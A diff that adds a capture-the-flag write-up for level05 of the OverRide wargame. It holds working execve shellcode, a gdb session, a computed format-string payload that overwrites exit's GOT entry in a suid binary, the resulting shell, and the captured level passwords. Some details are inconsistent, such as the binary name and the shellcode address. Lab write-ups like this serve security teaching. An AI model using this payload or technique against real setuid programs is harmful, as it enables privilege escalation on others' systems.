@@ -1,0 +1,57 @@
+Authenticating as level05/3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
+
+We come across a suid binary named level04.
+
+As it seems the binary is vulnerable to format string. We will try to overwrite the address of exit int The got to shellcode
+address. to spawn a shell.
+
+level05@OverRide:~$ export SHELLCODE=$(python -c "print '\x90'*64+'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'")
+level05@OverRide:~$ /tmp/gtv SHELLCODE
+SHELLCODE is at 0xffffd862
+level05@OverRide:~$ gdb
+GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
+Copyright (C) 2012 Free Software Foundation, Inc.
+License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+This is free software: you are free to change and redistribute it.
+There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
+and "show warranty" for details.
+This GDB was configured as "x86_64-linux-gnu".
+For bug reporting instructions, please see:
+<http://bugs.launchpad.net/gdb-linaro/>.
+(gdb) print 0xffff
+$1 = 65535
+(gdb) print 0xd87c
+$2 = 55420
+
+We want to write 0xffffd87c to the address of exit@ptl in the GOT but the address is too large if converted to decimal
+So we will split in two order and write it separately in the address of exit in GOT.
+
+0x80497e2 High order
+0x80497e0 Low order
+
+We will write 0xffff ( 65535 ) in 0x80497e0 + 2 which is 0x80497e2, and write 0xd87c (55420) in 0x80497e0
+
+We need now to follow this formula : [The value we want] - [The bytes already wrote] = [The value to set].
+
+Let’s start with the low order bytes :
+It’ll will be 55420 - 8 = 55412, because we already wrote 8 bytes (the two 4 bytes addresses for high and low addresses).
+
+Then, the high order bytes :
+It’ll will be 65535 - 55420 = 10115, because we already wrote 55420 bytes (the two 4 bytes addresses and 55412 bytes from the previous writing).
+
+It’ll be : '\xe0\x97\x04\x08' + '\xe2\x97\x04\x08' + '%55412x' + '%9\$hn' + '%10115x' + '%10\$hn' Let me explain :
+    '\xe0\x97\x04\x08' or 0x80497e0 (in reverse order) points to the low order bytes.
+    '\xe2\x97\x04\x08' or 0x80497e2 (in reverse order) points to the high order bytes.
+    '%55412x' will write 55412 bytes on the standard output.
+    '%9\$hn' will write 8 + 55412 = 55420 bytes (or 0xd87c) at the first address specified (0x80497e0).
+    '%10115x' will write 10115 bytes on the standard output.
+    '%10\$hn' will write 8 + 55412 + 10115 = 65535 (or 0xffff) at the second address specified (0x80497e2).
+
+whoami
+level06
+cat /home/users/level05/.pass
+cat: /home/users/level05/.pass: Permission denied
+cat /home/users/level06/.pass
+h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
+
+And Here it is, the password for level06.
